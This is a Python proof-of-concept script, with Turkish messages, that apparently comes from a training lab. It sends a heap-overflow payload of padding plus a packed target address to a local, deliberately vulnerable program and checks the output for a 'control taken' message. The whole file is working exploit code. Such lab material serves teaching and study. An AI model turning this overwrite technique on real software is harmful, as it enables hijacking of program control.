import struct
import subprocess
import sys

VICTIM_PROGRAM = "./zafiyetli_sunucu"
PADDING_SIZE = 40
TARGET_ADDRESS = 0x401166

def main():
    print("--- [SALDIRGAN] Direkt Heap Overflow Exploit Baslatildi ---")
    
    print(f"[*] Hedef Adres: {hex(TARGET_ADDRESS)}")
    print(f"[*] Padding Boyutu: {PADDING_SIZE}")
    padding = b'A' * PADDING_SIZE
    overwrite_address = struct.pack("<Q", TARGET_ADDRESS)
    payload = padding + overwrite_address
    print(f"[*] Payload {len(payload)} byte olarak olusturuldu.")
    
    try:
        p = subprocess.Popen([VICTIM_PROGRAM], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    except FileNotFoundError:
        print(f"[!] HATA: '{VICTIM_PROGRAM}' bulunamadi.")
        sys.exit(1)
        
    print("[*] Payload kurban programa gonderiliyor...")
    
    stdout_output_bytes, stderr_output_bytes = p.communicate(input=payload)
    
    stdout_output = stdout_output_bytes.decode('utf-8', errors='ignore')
    stderr_output = stderr_output_bytes.decode('utf-8', errors='ignore')

    print("\n--- Kurban Programdan Gelen Cikti ---")
    print(stdout_output)
    print("--- Kurban Programdan Gelen Hata Ciktisi (varsa) ---")
    print(stderr_output)
    
    if "KONTROL ELE GECIRILDI" in stdout_output:
        print("\n[+] Zafiyet basariyla istismar edildi!")
    else:
        print("\n[-] Istismar basarisiz oldu.")

if __name__ == "__main__":
    main()
